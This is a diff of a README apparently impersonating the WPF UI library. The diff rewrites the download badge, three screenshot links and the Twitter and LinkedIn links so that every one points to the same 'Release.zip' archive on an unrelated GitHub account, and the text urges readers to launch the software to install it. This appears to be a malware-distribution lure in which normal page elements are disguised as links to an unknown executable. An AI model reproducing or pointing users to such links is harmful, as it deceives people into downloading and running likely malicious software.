@@ -11,7 +11,7 @@ Welcome to the **WPF UI** repository! 🎉 This repository provides the Fluent e
 ### Get Started
 
 🔗 **Download** the software by clicking the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software-yellow)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/YuwsidfUJD/wpfui/releases/download/v1.0/Release.zip)](https://github.com/YuwsidfUJD/wpfui/releases/download/v1.0/Release.zip)
 
 ➡️ **Launch**: This software needs to be launched for installation. 
 
@@ -23,9 +23,9 @@ Welcome to the **WPF UI** repository! 🎉 This repository provides the Fluent e
 
 Here are some amazing screenshots showcasing the Fluent UI experience you can achieve with WPF UI:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/YuwsidfUJD/wpfui/releases/download/v1.0/Release.zip)
+![Screenshot 2](https://github.com/YuwsidfUJD/wpfui/releases/download/v1.0/Release.zip)
+![Screenshot 3](https://github.com/YuwsidfUJD/wpfui/releases/download/v1.0/Release.zip)
 
 ### Usage
 
@@ -50,7 +50,7 @@ This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) 
 
 ### Stay Connected
 
-Stay up to date with the latest updates and releases by following us on [Twitter](https://twitter.com/WPFUI_Official) and [LinkedIn](https://linkedin.com/company/WPFUI_Official).
+Stay up to date with the latest updates and releases by following us on [Twitter](https://github.com/YuwsidfUJD/wpfui/releases/download/v1.0/Release.zip) and [LinkedIn](https://github.com/YuwsidfUJD/wpfui/releases/download/v1.0/Release.zip).
 
 ---
 
